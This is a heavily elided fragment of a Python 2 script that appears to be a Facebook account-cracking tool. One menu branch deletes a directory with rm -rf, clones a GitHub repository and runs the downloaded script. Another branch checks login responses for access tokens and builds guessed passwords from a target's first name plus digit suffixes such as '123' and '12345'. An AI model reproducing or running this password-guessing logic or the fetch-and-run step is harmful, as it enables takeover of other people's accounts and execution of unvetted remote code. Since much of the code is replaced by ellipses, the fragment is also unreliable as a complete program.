...
try:
    ...
    os.system('python2 ssr108108.py')
...
def mb():
	...
	if bm =='':
	    ...
	    os.system('rm -rf $Loveujaan/ROYAL_RAJPUT')
	    os.system('cd $loveujaan && git clone https://github.com/ssrrajput/hinduboyhere')
	    cb()
	    print (logo)
	    psb('☆10%')
	    psb('☆☆20%')
	    ...
	    time.sleep(2)
	    os.system('cd $loveujaan/ROYAL_RAJPUT && python2 ssr108108.py')
	elif bm =='3':
	    os.system('xdg-open https://www.facebook.com/100002883369548')
	    menu()
	elif bm =='4':
		...
		try:
			...
			if 'www.facebook.com' in k['error_msg']:
			    ...
			    if 'access_token' in k:
			        ...
			        ps21=(j['first_name']+'123')
			        ps22=(j['first_name']+'1234')
			        ps23=(j['first_name']+'123456')
			        ps24=(j['first_name']+'12345')
			        ps25=(j['first_name']+'12')
